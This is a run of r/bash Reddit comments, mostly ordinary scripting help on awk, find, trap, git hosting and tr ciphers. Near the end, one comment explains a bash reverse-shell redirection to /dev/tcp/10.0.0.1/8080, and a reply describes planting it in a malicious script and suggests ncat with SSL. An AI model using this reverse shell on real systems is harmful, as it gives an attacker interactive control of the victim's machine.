Looking at your script, I think your problem just can't be solved at all the way you are trying to make it more efficient. The easiest way to do this is really to not use a loop at all and instead just type all commands. Bash might just not have good enough data structures to help with this and instead of trying to fix repetition with programming and a loop, you would just do some copy+paste with your editor to help with repeating stuff. The problems you run into is about bash's "word splitting". I found this here that seems to be a good explanation: http://mywiki.wooledge.org/WordSplitting That helper script mentioned on the page is good to have to experiment with this on the command line whenever you run into problems like what you experience now. You can also write it as a function and put it into your ~/.bashrc. That function would look like this: args () { printf "%d args:" $#; printf " &lt;%s&gt;" "$@"; echo } You could also use that in your script for debugging, use it to print the command lines that would be executed.
Formatting is just fine (*I assume...*) :) Thanks for your help and a push in the right direction!
Use Ansible’s [script module](http://docs.ansible.com/ansible/latest/script_module.html). Since you say SSH keys are out of the question, you can set your password as an inventory parameter called [ansible_ssh_pass](http://docs.ansible.com/ansible/latest/intro_inventory.html) Then throw your ansible-playbook command into a cronjob. 
This is just about what I need. But doesn't include the lines after the title. They are DNA sequences, so the way it works is: &gt;Some title (eg; NODE_540...) ACGTTCTACTT... ACTACTA.. Yours works perfect for finding the title; I just need to be able to also pull the lines after, which are all of variable length. Essentially there are n lines until it encounters the next "&gt;" which denotes the start of the next sequence. That's why I had started with awk. That being said, -f is neat! I've not seen that before.
Of course. RSPaV.BLAST.txt: multiple columns, I only care about the first one, (NODE_x...) NODE_16_length_1511_cov_10.6023 NC_001948.1 94.831 503 26 0 3 1511 3581 5089 0.0 1160 NODE_17_length_1505_cov_30.7069 NC_001948.1 92.308 494 38 0 1482 1 5252 6733 0.0 1108 NODE_54_length_826_cov_4.63813 NC_001948.1 48.889 45 23 0 259 393 3835 3969 1.41e-39 48.3 And scaffolds.fasta has a title (which corresponds with column one from above) and DNA sequence data of varying lengths) &gt;NODE_1_length_5441_cov_410.702 CCGCCCCGAAGGGGACGAAAAATGGTTTTTAGAGAACGAGAAGACGGTTACGCAGTTTTG CCGCAAGCTGGCTGCTGAACGCCCTCTTAAGGATATTCGCGATGAGTATAATTACCCCAA &gt;NODE_2_length_3249_cov_6.69912 CATAGTTTATTTCTGTGGGGTCAGTGGTAACATTTCCTTCATCATTTCTAATTGTGTTTA CTTAGATCTTCTTTTTTTCTTAATTATTCTAGCTACTGTTCTAGCTATCATGTTAATTTT What I want to do is pull the title from that first column in RSPaV.BLAST.txt and use that to ID the correct sequence in scaffolds.fasta and pull both the title and the DNA sequence information. The way the scaffolds.fasta format works is that it has a "&gt;" followed by some title (eg: NODE_16...) then a new line and then some sequence information. All the info is considered to be sequence data until the next "&gt;" is found. Which is why I have been using "&gt;" as an identifier.
ok try this awk 'NR==FNR{a["&gt;"$1]; next} $1 in a' RSPaV.BLAST.txt RS= FS='\n' scaffolds.fasta I am assuming that you want to match entire first column like `NODE_16_length_1511_cov_10.6023` and `NODE_17_length_1505_cov_30.7069` etc
I've given that a shot, and it results in no output. 
I checked it on gawk, not sure if this doesn't work on non-GNU versions...
perfect, I'll give it a shot in gawk. Thanks for your help!
here's a perl version that does the same perl -F'\n' -00 -ne 'BEGIN{while(&lt;STDIN&gt;){@x=split; $h{"&gt;".$x[0]}=1}} print if $h{$F[0]}' &lt;RSPaV.BLAST.txt scaffolds.fasta
Whoops, figured this out bind TAB:menu-complete
Ah. Now that I see your example `scaffolds.fasta` file it's clearer. This is likely do-able with `grep` if it supports `-P` i.e. `perl` regex. But if you're reaching for that, you may as well just use `perl` IMHO. `sed` is another tool that can do this, using extremely similar - if not exactly the same - `perl` style regex.
Keep all your url of interest in a plaintext file. Have a script to read that file and present a menu for you to select. The script. ############################################################################## #! /bin/bash input_file=$@ prog(){ list_of_links=( $(cat $input_file | grep "reddit" | awk '{print $1}')) select opt in ${list_of_links[@]} do case ${list_of_links[@]} in *) firefox $opt &amp; 2&gt; /dev/null ;; esac done } prog The plaintext file of url would look like following ############################################################################## # keep your links to sites you like in a plaintext file; in the first field you have the url; https://www.reddit.com https://facebook.com http://someones.livejournal.com https://someone.blogger.com https://www.reddit.com/r/someplace_interesting ##############################################################################
How about this? #!/usr/bin/env bash msg() { echo -e "$@"; } die() { msg "$@"; exit 1; } declare -A prompts=( ["username"]="Enter your user name: " ["email"]="Enter your email address: " ) msg "Collecting your data for Git setup...\n" # user input for v in ${!prompts[@]}; do read -p "${prompts[${v}]}" ${v} done # make sure they are set [[ -n ${username} ]] || \ die "Missing username!" [[ -n ${email} ]] || \ die "Missing email!" IFS=':' gitArray=( "user.name '${username}'":"user.email '${email}'":"color.ui auto" ) for v in ${gitArray[@]}; do git config --global ${v} done I have something similar that sets my email automatically when I cd into a git repo. Looking at my code may give you some ideas: [git_user_email.sh](https://github.com/jnalley/dotfiles/blob/master/bash.d/scripts/git_user_email.sh) [runs above script when I cd to a git repo](https://github.com/jnalley/dotfiles/blob/master/bash.d/term.sh#L25-L35)
What are you actually trying to do?
I want a script to run when I’m idle, and being idle is detected by a command which returns a number of seconds the user is idle. But I want the script to automatically stop when I return.
Sounds like you still arent telling me what youre actually trying to do, but heres a hacky way to attempt what youre asking (even though job control would be a much smarter way to approach this, if more manual). &gt; poll xdotool getmouselocation every n seconds. If it hasn't changed over the last t seconds launch and background process x. If mouse location changes, pkill x.
So... like a screensaver? Or a keepalive script? Or...? Come on, OP, details!
Yes, run your thread, make it write your value in a file. Store the pid. `$!` Add a loop to check the value and trigger the kill on stored pid. 
Perfect. Thank you!
But do a bit of checking in the kill clause to be sure it is really your PID that you are killing. If the script terminates abnormally for whatever reason, you still have a PID in the file that is no longer correct. On a busy system, some other process can come along and randomly get that PID. Then your script re-launches, and kills (or tries to kill) a PID that has nothing to do with itself. I have seen this too often on a busy enterprise system.
Since only the last digit differs, you can use a single -name operator, like this: `-name '*201[78]*'` If the difference had been more than one character, you'd have to "or" together multiple -name operators: `-name '*2017*' -o -name '*2018*'` So in full: find /volume1 -mtime -7 -name '*201[78]*' -print or find /volume1 -mtime -7 \( -name '*2017*' -o -name '*2018*' \) -print Recommended reading: [UsingFind](http://mywiki.wooledge.org/UsingFind)
Thank you so much. I was trying with -o but I was not using \()\. Even better to know about []. Legend :D
&gt; do a bit of checking in the kill clause to be sure it is really your PID that you are killing. I've been thinking about how you would do this, and this is what I came up with, ps -eo pid,ppid,etime,cmd * pid - check the PID matches the one you launched * ppid - check the Parent PID is you * etime - Check that the execution time started when you launched it * cmd - Check that the command the same name as what you launched This should probably be fairly reliable, but feels a bit hacky. Do you know of a better way to check? 
/u/flaflashr's example is: &gt;If the script terminates abnormally for whatever reason That's probably a job for `trap` to handle. Let me know if you'd like an example.
Github. Just be sure any sensitive info is scrubbed from your scripts before you commit.
Well, if your offering, I'd love to learn a new tool!
OK, so here's an example: I have a script that does a lot of work so I put in a spinner function. This goes hand in hand with an end spinner function and would usually be used like this: Fn_Spinner &amp; SpinPID=$! [some long running task] Fn_EndSpinner The spinner function uses `tput` to ensure that it stays in place and hides any unwanted output. The script also has a function for cleaning up after itself, which ensures that any temp files that are created are removed etc, and this function includes the operative parts of `Fn_EndSpinner()`: Fn_CleanUp() { # Kill any remnant instances of Spinner kill "${SpinPID}" 2&gt;/dev/null wait "${SpinPID}" 2&gt;/dev/null ... So that function runs at the very end of the script, or it can be set off by a trap like so: trap Fn_CleanUp SIGHUP SIGINT SIGTERM If I didn't do this, what would happen is if, say, I Ctrl-C'd the script, any temp files that were created might remain in place, and the spinner would just keep on spinning forever and chomping any input until killed from another terminal. By using `trap`, I... "`trap`"... the Ctrl-C, which invokes `Fn_CleanUp()` which ensures that the system is in the intended state i.e. no temporary files and no spinner. I can't think of any `trap` how-to's that I've read and liked because I haven't really needed them, so here's some links that I've skimmed through but won't guarantee are correct: * https://www.ibm.com/developerworks/aix/library/au-usingtraps/index.html * https://www.shellscript.sh/trap.html
If you have private/ sensitive information, private GitLab is probably a good idea. Also if you want them all on one repo Otherwise, I keep my script on GitHub Gists. Nice for single file things, such as bash scripts (or shell scripts, or a small C program) 
Thank you, I think that will be a great starting point for me.
Bitbucket allows free private repositories
The syntax you see in the Perl update uses a *prepared statement*, which is a method to combat SQL injection attacks. I don't think the MySQL cli allows you to do that, so your options are to assume the data is clean and just use normal bash string interpolation, or move to a proper programming language (like Perl, but Python is a more readable choice imo). That will also come with a bunch of better error handling, prevent you from passing the password on the command-line where it can be snooped (although IIRC MySQL hacks around this, but still not excellent practice). Why are you rewriting this script?
```exarray=(^foo^bar;^foo2^bar2;etc)``` ```ex +"${exarray[@]}" "$1.md" -cwq``` Although this is probably wrong. Comment it I geuss. UNIX doesn't really do file type extensions. ./foo.sh foobar will tab autocomplete the filename and take it in full as $1. 
I use my scripts on a lot of different machine in a few locations. So I just put them in a evernote folder. I copy paste into a file and then run them.
So does gitlab
 filename=$(echo $1 | cut -f1 -d ".") echo "Filename up to first dot is: $filename" The 'cut' command cuts a line into separate fields (f1) based on a delimiter (d). In this example, it's 'cut field1 delimited by period'
Spend the time to get a basic understanding of git. It's glorious and will make any development activities infinitely more secure and flexible.
GitHub
Gitlab or github. If you use github, you'll have to scrub passwords, api keys, etc. I run a gitlab-ce server at home, but you can run it anywhere you get can to it remotely.
I don't see why a script would need to be "stored" anywhere other than where it was being used, unless it was part of some meaningful software package/project that was already being published and distributed.
I assume what you want is something that checks if the file name entered by the user has the `.docx` extension, and if it does not, add the extension. One way to do this would be a grep statement- if echo $1 | grep "\.docx$" # if the extension does exist in the parameter name then filename="$1.docx" else filename="$1" fi Another way can also be using parameter expansion. filename="$1" extension="${filename##*.}" Then it is just a matter of checking the extension.
I'm trying to rewrite it because it's a very short script (about 8-10 lines total) but in Perl requires installing additional Perl modules that consume far more space than the script itself, plus are a PITA to install, plus I'm not especially fond of Perl. I don't care about passing the password on the command line because this program run on the same machine as the database, also the username and password are stored *in plain text* by another program on the system so that cat is already out of the bag for anyone with access to the local system. I don't know Python well enough to rewrite it in that (actually I don't know Perl that well either) but I already have all but this one line rewritten in BASH, so that's why I was hoping there was some way to do this. Assuming that the data is clean is fine, I can't conceive of a situation where it would not be since it's basically the result of this: changed_ip=$(dig +short myip.opendns.com @resolver1.opendns.com) || { echo "Unable to retrieve IP address"; exit 1; } So either *changed_ip* should contain a valid IP address, or if it doesn't the script should exit without ever getting to the line where it tries to write to the database.
Gitlab. It's amazing.
They reside on the box that I used to create them. I write scripts at random all the time if it’ll be faster than performing some menial tasks. They’re all over the place and I’m sure I’ve written numerous iterations of the same script a ton of times for different applications. So I guess I’m kind of sloppy in that sense but I do enjoy stumbling on old scripts and laughing at how I wrote something the previous year. 
Just a note: /r/awk exists.
Well that's exactly what I'm having, but my time is more valuable then re-writing it everything time! That's why I was looking for a solution.
Apparently we need to use github. lol 
I use scripts a lot, but I don't feel like re-writing them when it's not needed, so a central place which I can access, and place them everywhere.
The `number` program (in the `bsdgames` package on most systems) does this already. Remember the story of the [10,000 lines.](http://www.catb.org/esr/writings/unix-koans/ten-thousand.html)
Ah I see. Its like being an amateur cook, where you actually have to "store" your recipes in order to be able to make the same dish again.
Dude, this is super dope. Thanks a bunch!!
Cool. I did not know about this. And yeah, I'm just trying to be clever. And then when it didn't work I wanted to make it work :P
You could also try gitolite - install it on one of your servers and you are ready to go...
Well yeah, so you don't have to figure out how much pepper and salt to add, and making something nasty! Saves a bunch of time, "re-inventing the wheel" so to speak. 
This should do it assuming the var data-type is a character string: mysql_response=$(mysql mydatabase -u $user -p$password -se 'update Mysettings set val='\"$changed_ip\"' where `key`="ipaddr" ') 
Worked perfectly, thanks!
I just run Gitea on my NAS, because it's the easiest self hosted solution to install and setup. Combined with a dynamic DNS and a port forward and it's perfect.
Yes, definitely something that would be a good idea for *amateur* cooks.
Open source equivalent, but Gitlab != Enterprise Github
This is why I have my own svn server at home + dynamic dns service. I haven't tried it, since I'm used to subversion, but you can [install your own git server](https://www.linux.com/learn/HOW-RUN-YOUR-OWN-GIT-SERVER) too.
And if you want encrypted git repositories, there's [KeyBase](https://keybase.io/blog/encrypted-git-for-everyone).
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
not exactly sure what you needed, but see if this helps $ cat script.sh read -r xyz awk -v a="${xyz}" '{print a, $0}' abc.txt &gt; op.txt $ cat abc.txt foo baz good bad $ bash script.sh sample text $ cat op.txt sample text foo sample text baz sample text good sample text bad Further reading * https://stackoverflow.com/questions/19075671/how-do-i-use-shell-variables-in-an-awk-script * http://mywiki.wooledge.org/Quotes
 echo varname | awk -v varname=$varname '$0="varname"$0' ABC.txt &gt; output.txt The issue here is the quoting of varname. By quoting it you are turning it into a literal string match instead of a variable match. You should also be using double equals for the match. Options: awk -v varname="${varname}" \ '$0 ~ varname' #$0 regexmatch (in this context, means it contains varname) '$0 == varname' #$0 is literal match of varname '$0 == "varname" ' #$0 is literally the word, varname edit - with output :~$ varname=test :~$ echo $varname | awk -v varname="${varname}" '$0 ~ varname' test :~$ echo $varname | awk -v varname="${varname}" '$0 == varname' test :~$ echo $varname | awk -v varname="${varname}" '$0 == "varname"' :~$ echo varname | awk -v varname="${varname}" '$0 == "varname"' varname 
Remove the spaces around the . in the last tr command and it works (i.e. change `' . '` to `'.'`). Also add a done to the end ;) $ path=input.txt $ echo "THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG" &gt; $path $ for i in $(seq 25); do echo $i "$(cat $path)" | tr $(printf %${i}s | tr ' ' '.')\A-Z A-ZA-Z &gt; done 1 UIF RVJDL CSPXO GPY KVNQT PWFS UIF MBAZ EPH 2 VJG SWKEM DTQYP HQZ LWORU QXGT VJG NCBA FQI 3 WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ 4 XLI UYMGO FVSAR JSB NYQTW SZIV XLI PEDC HSK 5 YMJ VZNHP GWTBS KTC OZRUX TAJW YMJ QFED ITL 6 ZNK WAOIQ HXUCT LUD PASVY UBKX ZNK RGFE JUM 7 AOL XBPJR IYVDU MVE QBTWZ VCLY AOL SHGF KVN 8 BPM YCQKS JZWEV NWF RCUXA WDMZ BPM TIHG LWO 9 CQN ZDRLT KAXFW OXG SDVYB XENA CQN UJIH MXP 10 DRO AESMU LBYGX PYH TEWZC YFOB DRO VKJI NYQ 11 ESP BFTNV MCZHY QZI UFXAD ZGPC ESP WLKJ OZR 12 FTQ CGUOW NDAIZ RAJ VGYBE AHQD FTQ XMLK PAS 13 GUR DHVPX OEBJA SBK WHZCF BIRE GUR YNML QBT 14 HVS EIWQY PFCKB TCL XIADG CJSF HVS ZONM RCU 15 IWT FJXRZ QGDLC UDM YJBEH DKTG IWT APON SDV 16 JXU GKYSA RHEMD VEN ZKCFI ELUH JXU BQPO TEW 17 KYV HLZTB SIFNE WFO ALDGJ FMVI KYV CRQP UFX 18 LZW IMAUC TJGOF XGP BMEHK GNWJ LZW DSRQ VGY 19 MAX JNBVD UKHPG YHQ CNFIL HOXK MAX ETSR WHZ 20 NBY KOCWE VLIQH ZIR DOGJM IPYL NBY FUTS XIA 21 OCZ LPDXF WMJRI AJS EPHKN JQZM OCZ GVUT YJB 22 PDA MQEYG XNKSJ BKT FQILO KRAN PDA HWVU ZKC 23 QEB NRFZH YOLTK CLU GRJMP LSBO QEB IXWV ALD 24 RFC OSGAI ZPMUL DMV HSKNQ MTCP RFC JYXW BME 25 SGD PTHBJ AQNVM ENW ITLOR NUDQ SGD KZYX CNF $
I am guessing that your file contains only lower case characters (a-z), but the code's substitution is for upper case only (A-Z), so adding lower case too should work: read -p "File path " path J="$(cat $path)" for I in $(seq 25); do echo $I $J | tr $(printf %${I}s | tr ' ' '.')\A-Z A-ZA-Z| tr $(printf %${I}s | tr ' ' '.')\a-z a-za-z done 
You can use -e instead of separate seds. Use \\ to break long lines. Also note that -i requires a backup file extension on e.g. OSX. I usually just do: sed -i.bak -e "s/1st/replace/g" -e "s/2nd/replace/g" file [ -f "file.bak"] &amp;&amp; rm -f "file.bak"
Funny guy you... ➜ ~ path=input.txt ➜ ~ echo "THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG" &gt; $path ➜ ~ cat $path zsh: command not found: cat ➜ ~ env zsh: command not found: env ➜ ~ echo $PATH input.txt Before I destroy another terminal, would you like to walk us lesser beings through the `tr` stuff? `printf`adds whitespace matching the number of steps the letter should shift, then the space is swapped for a ., after which I'm lost. How is `tr`incrementing the letters?
You're using zsh, not bash. I'm not a zsh expert but I know it's got some weird stuff with case sensitivity and variables. Try it in bash. It looks like by setting $path you're overwriting $PATH. This won't happen in bash
tr translates each character in the first argument to the respective character in the second argument. Let's look at the case i=3. Then the arguments expand to ...ABCDEFGHIJKLMNOPQRSTUVWXYZ and ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ So line each letter up to the one below it to see how the rotation occurs. A goes to D, B goes to E, and so on. You have to put A-Z in the second argument twice to make sure the last i letters in the alphabet get translated.
Ah, of course, now I get it. Thanks!
Yeah, I know, just thought it was funny. ;)
Well hell. That's what I was originally looking for. My problem was solved by using the python module, but this would have made it quicker.
whereas `[[` is special &gt; type [[ [[ is a shell keyword
Yep, and that's why it has so many pitfalls associated with it. Bash has [[, which actually is syntax and is much better.
Even `[[` is not actually syntax. It is a reserved word (a.k.a. shell keyword), like `case`, `if`, `while`, `until`, etc. This means, among other things, that you still need spaces around it. 
Actually, the test command has several forms: $ type -a test test is a shell builtin test is /usr/bin/test test is an undefined function $ type -a [ [ is a shell builtin '[' is '/usr/bin/[' [ is an undefined function $ Originally back in bourne shell days test started out as an standalone, but implementing it as an internal command made it much faster and safer. If you want to use the external version you'd need to specifiy it as a full path /usr/bin/test or /usr/bin/[ 
For the extension, no need to run any command other than test. Forgive me, can’t test, but something like: [[ “$1” =~ \.docx$ ]] &amp;&amp; infile=“$1” || infile=“$1.docx” 
Make a list of the "toolbox" of the language and write a script to use at least on example from each category: * Arithmetic Operations ) (( myval = $x + 1 )) * Control Structures) if/then, case * Loop Structure) for, while, break, continue , *select* * String operators) comparison, equality, substrings * Data Structures,) variables, arrays * Procedures/ Subroutines) * I/O redirection) . greaterthan/lessthan, exec, pipe, namedpipe, /dev/std* * Multiprocess) backgrounding, waiting, waitpid, kill, nohup For instance, did you know you can create a procedure, and then pipe its output? Very nifty way to create powerful structures that are also readable/maintainable. did you know you can do: command || error_subroutine And have the result codes of your command jump you to different code paths? What you may have seen in books, is not all there is! Bash is huge....TEAR....IT.....UP! 
You know how people like to watch fireplace videos these days? What about a command-line ASCII version with the ABC's of some terminal commands shown every 5 seconds for nearly 20 minutes? Merry Christmas!
you may also like cacafire ! c: although this one require GUI the cacalib can convert an image to ascii text/color directly on your terminal
Use !~ 
How about this. my_function(){ while read line if [ $line != "?" ] then do echo $line else : fi }&gt;&gt;$output_file 
This will do the trick awk -F, '!/\?\?\?/ { printf "%s,%s is %d years old\n", $1, $2, $3}' the pattern is matched against the whole line. Each question mark is escaped because the question mark is a regex metacharacter. The pattern is negated to act on the lines that _don't_ include the pattern. The printf is self explanatory I think.
As /u/MostLegit mentioned, you want `!~` which basically means "does not contain". Side piece of advice that you pretty much never hear (because who ever talks about awk code): Get in the habit of writing out verbose awk code unless you're doing something _very_ simple. The reason is that ProBoxAlpha:tmp hegemon$ awk '{ if ($0 !~ "?") {print}}' example and ProBoxAlpha:tmp hegemon$ awk '$0 !~ "?"{print}' example will both give you the same output BUT only the former will let you do more complicated things like adding an `else` statement: ProBoxAlpha:tmp hegemon$ awk '{ if ($0 !~ "?") {print}else {print "invalid record"}}' example Eric,Pearson,50,14000 invalid record invalid record invalid record invalid record Con,Tacts,26,12345 ProBoxAlpha:tmp hegemon$ awk '$0 !~ "?"{print}else {print "invalid record"}' example awk: cmd. line:1: $0 !~ "?"{print}else {print "invalid record"} awk: cmd. line:1: ^ syntax error Also, now that I'm all hyped up to get to talk about awk, ICYDK, awk has a built in profiler that will help you assess your code and bonus, pretty print it: ProBoxAlpha:tmp hegemon$ awk --profile '{ if ($0 !~ "?") {print}else {print "invalid record"}}' example &gt; /dev/null ProBoxAlpha:tmp hegemon$ cat awkprof.out # gawk profile, created Tue Dec 26 18:45:28 2017 # Rule(s) 6 { 6 if ($0 !~ "?") { # 2 2 print $0 4 } else { 4 print "invalid record" } } 
I disagree with you on using if when it’s not explicitly required to stack with else. I think that awks condition/action workflow is so clear that throwing in unneeded ifs make it look as if you’re unfamiliar with the workflow of awk (where clearly you are not) 
Thanks that worked
I didn't want to have find the IP address myself. I have a computer to do that for me, right? for i in $(netstat -n4 | awk '{print $5}' | grep ":" | cut -d":" -f1) do echo -ne "$i\t" pid=`netstat -natpe | grep "$i" | awk {'print $9'} | awk -F "/" {'print $1'}`;ps -eaf | grep $pid | grep -v grep done But, couldn't you just `lsof -i -n`? 
*lsof -i -n* FTW 
**egrep** perhaps? $ cat contacts Eric,Pearson,50,14000 ???,Last,16,22000 Michael,Scott,???,24500 First,???,27,30000 Foo,Bar,50,??? Con,Tacts,26,12345 $ egrep -v "\?\?\?" contacts Eric,Pearson,50,14000 Con,Tacts,26,12345 
Eh, you can have bash on e.g. *BSD, which doesn't have `lsof` in base, and perhaps good reason or inability prevents installation. But yeah.
I know it's not POSIX, but have you had any thoughts about implementing `$RANDOM`? From memory, other implementations use a fairly bog standard 2 ^15 -1 LCG which returns a positive integer in the 1-32767 range. Last I went digging through the source code, `bash`'s was literally a textbook BSD LCG RNG. Literally textbook, literally BSD: /* From "Random number generators: good ones are hard to find", Park and Miller, Communications of the ACM, vol. 31, no. 10, October 1988, p. 1195. filtered through FreeBSD */ So adding `$RANDOM` that's compatible could be as simple as copying and pasting. Not necessarily from `bash`'s source, there are [plenty of examples to consider.](https://rosettacode.org/wiki/Linear_congruential_generator) But why not go further and add something like `$SRANDOM`? So the idea is that `$RANDOM` delivers random numbers fairly uniformly in the 2 ^15 -1 range, so any current scripts depending on this variable will work. `$SRANDOM`, on the other hand, could generate a number based off a system test like `getconf LONG_BIT` and within the subsequent range (e.g. 2 ^ 63 -1 = 1-9223372036854775807). Or, if that range is too large or the system test not reliable enough, then you could just settle on something like 2 ^ 31 -1 There are plenty of algorithms to choose from for that, such as the xorshift family or the PCG family. Then this potentially becomes interesting. Why not have the same algorithm for both variables but change the bitshifting triplets to get different desired bit rates? Or, use a de-biasing modulo to pluck out numbers for `$RANDOM` from `$SRANDOM`. Just a couple of thoughts :) 
`$RANDOM` will be there eventually. Oil is not limited to POSIX sh, because POSIX sh isn't enough to write many programs. I'll have to look at what bash does, but I think just using libc `rand()` may be good enough for `$RANDOM` (insecure random). For secure randomness, there is `/dev/urandom` and Linux-specific `getrandom()`. I have a bunch of notes on this lying around since I have worked on software that relies on RNGs for security. Generally, for secure randomness, you should rely on the kernel and not on user space code. You fundamentally have less of an ability to generate unpredictable random numbers in user space than in the kernel. 
Why `egrep`? `???` is a fixed string. The BREs of regular `grep` are already a little heavy-weight for it, `fgrep` is a better fit; but `grep -v '???'` *would* work fine. But let's go a little heavier and upgrade to EREs with `egrep`, and have to do the extra work of backslash escaping each `?`.
 grep -v ’??’ contacts.csv | awk ’...’ 
Came about those two, trying out later .. http://robobrowser.readthedocs.io/en/latest/readme.html https://github.com/hadley/rvest
man wget
&gt; man wget its a dynamic tabbed site, i want to search through the content not scrape the files. as im aware wget downloads the files and is not solely reading the content of the web page. Havent tried the prev linked scripts yet, may this works. Software running the site is bower, node &amp; yeoman
Beyond curl there's not a ton of options out there. Depending on how complicated the page is you may be better off with a somewhat simple python script with bs4. If the page is simple you can curl into either sed or egrep.
let me try out the linked tools ive posted - im on work right now, will try out asap and give some feedback.
unrelated, but came about this one too, didnt work for me but i found it somewhat neat, maybe for other purposes https://github.com/minemidnight/web-search-word
Python requests or selenium might be better suited for your needs.
Try Scrapy, it is a Python module but it can be implemented in the command line easily.
thx, ive bookmarked selenium, came to robobrowser and rvest about it.
thx
Try to see what happens if you use curl with its `-L` parameter, see if it then repeats and follows the redirections to the real page.
curl -L localhost:81/#!/ bash: !/: event not found curl -L localhost:81 just prints the source code. ill give fedback on the linked tools asap, not sure if i do it today, on the move... 
That first error message is from bash. It gets confused because of the characters in that URL. You need to use `'` quotes to make it treat all characters there as pure text, like so: curl -L 'localhost:81/#!/'
Version control
youre correct, but it reads the source, not the content
What do you mean exactly?
its a dynamic generated tabbed page i want to spider / search for a string. Thats what makes it tricky :)
Right, but is the final source generated locally in the user's web browser, or is it done on the server? You mentioned npm, so isn't it done on the server? If it's done in the web browser, maybe in the source you get to see with curl there's an URL for some JSON file or something. You could then try to look at that file and see if that helps instead of searching for a string in the page that a user with a normal web browser would see.
True, I don't see the need for `egrep` when `grep -v "???"` would do the trick. I just wanted to do it all with `awk`.
If you use its `-E` or `-r` parameter to switch it to "extended" regex, you can then write `{}`, `()`, `|`, `?`, `+` without `\`. This should be the same in grep with its `-E` parameter being needed for those characters to work without `\`.
Thanks for clearing it up
Oh, huh, I tried lsof but didn't realize you could do it by destination IP of session. I'm a network engineer by trade and a mediocre linux admin by necessity...
Oh, huh, I tried lsof but didn't realize you could do it by destination IP of session. I'm a network engineer by trade and a mediocre linux admin by necessity... 
curl makes sense as a command line util since it's purpose is fetching things over network. This seems like a tool that has no good reason to have a dependency on a website. 
Is there any chance the site has an API you could query directly instead of parsing the HTML?
No, theres no api. havent had time yet to try rvest and robobrowser yet
Are you on Windows? Try /r/Batch/
This. What I'm seeing is very much not Bash.
Your filenames look like they are in strict alphabetic order by timestamp so this should be easy. `head` with a negative count outputs all but the last N lines, so you should be able to do this (I dropped the grep since awk can do that directly): for oldsnap in $(rbd snap ls ceph_vm/vm-190-disk-2 | awk '/quarterhour/ {print $2}'|sort|head -n -4); do echo rbd snap rm ceph_vm/vm-190-disk-2@${oldsnap} done It's possible with `xargs` too but I think this example is cleaner. Remove the `echo` to do it for real.
After using git, I could never go back to svn. Try gitlab. Takes about 2 minutes to install (Deb and rpm available)
I've used git for a couple projects, I just haven't set up my own host. Maybe I didn't get into all the features of git, but I prefer the sequential version numbers of subversion. I don't understand why people claim to have issues creating and merging branches in svn, and I have no need for offline commits. I had a lot more problems with basic commits in git than I did in svn.
It's `((...))`, not `$((...))`. That `$((` thing exists as well and is something different and you might have gotten the two confused. The `-eq`, `-lt`, `-gt` etc. are used inside `[[` when you want to compare numbers and not text. They are important and exist because `&lt;` and `&gt;` and such are text comparisons inside `[[`. What this means is, if you try to use `&lt;` etc. on numbers inside `[[`, you have an effect where for example `120` sorts in front of `53` because the text character `1` sorts in front of the text characters `5`. Inside `((`, things work completely different. You have the same operators as you might know from the C programming language or Java or something. You don't have to use `$` in front of variable names as any text inside `((` is seen as a variable name. What I mean concretely, the following two lines do exactly the the same: [[ $x -ge 53 ]] (( x &gt;= 53 )) You still need the `$` for those special variables `$1`, `$2`, etc. I think the main reason you want to use `((` is that it's easier to read, but it's also interesting if you want to work with numbers in spots other than comparisons inside an `if ...; then ...; fi`. You can do the following with `((`: (( x = x + 2 )) (( x += 2 )) Those two lines would do the same as this one that you might know: x=$(( x + 2 )) You can get online help at the command line about all that stuff by typing the following: help test help '[[' help let help '((' That `[[` thing is an improvement on `[`. You should always use `[[` when writing a bash script as it protects against some weird mistakes that are possible to make with `[` (I think it's just forgetting `"` for variables). The `==` is a bash thing and you need `[[` for it. What the `==` can do on top of `=` is described in `help '[['` in a sentence somewhere. That "pattern" that's mentioned there means something like this: x="red hat" if [[ $x == red* ]]; then ... fi It's the same patterns you know from using wildcards at the command line to select files.
When you run your script, did you typo the post? You put that you're running `./ethminer` to call your script, but your script is called `mine.sh`. I just want to make sure that that's not the issue that you're running into. The error that it's spitting out is a little surprising since the "host" in this case wouldn't be a fully qualified URL (with the `http://` and the port at the end). so I'm thinking that you just called the wrong script. Also, 2 protips: 1. you don't need to define that `mine` function. you can make `mine.sh` be just 2 lines: the shebang and `./ethminer -G -S "$1" -O "$2"` 2. you should quote your variables when you use them since it will prevent headaches if the shell breaks your args up on spaces.
Hey, no I was not running the incorrect one, to call the script I always ran ./mine.sh I fixed it accordingly with what you said, but it's the same error. Could this have to do with the options not being properly understood? The -G -S -O
*&gt;* means redirect a file descriptor (by default stdout or file descriptor 1). *&lt;* means redirect a file descriptor (by default stdin or file descriptor 0). *&gt;&amp;* means redirect a file descriptor (by default stdout or file descriptor 1) to another file descriptor. *&gt;&amp;/dev/tcp/10.0.0.1/8080* means redirect standard out of the process bash -i to /dev/tcp/10.0.0.1/8080. *0&gt;&amp;1* means redirect file descriptor 0 (stdin) to the same file descriptor that 1 (stdout) is redirected to. This would normally be normally written as *&lt;&amp;1*. Think of redirection as assignment. Processes start with three default file descriptors. 0: stdin, 1: stdout, 2: stderr. Input is read from stdin, output is written to stdout, and errors are written to stderr. BTW this command doesn't look too safe. You're connecting to a server over an unencrypted connection, and giving it an interactive shell on your machine. Yes, I found reading "shit" wasn't enough to understand it. You gotta just try things out and see what happens.
I think it should be something like this: #!/bin/bash mine(){ ./ethminer -G -S « $1 » -O « $2 » } mine eth.pool.minergate.com:45791 mininguser@gmail.com And then you can run : ./mine.sh
^ this guy knows. In this case though, the IP address is an address probably controlled by OP and this command would be run on the machine he was targeting. Target runs a malicious script that contains this command, OP gets access to the target rig. Any IDS/Firewall worth anything would block this immediately. If nmap is installed on the target machine, ncat is a better option than both the reverse bash shell and netcat since it supports ssl. 
 How about this. #!/bin/bash mine(){ ./ethminer -G -S $1 -O $2 } mine $* ------------------------- Also, is there any difference between prog(){ echo "$1 $2 $3" } prog $1 $2 $3 and prog(){ echo "$1 $2 $3" } prog $*
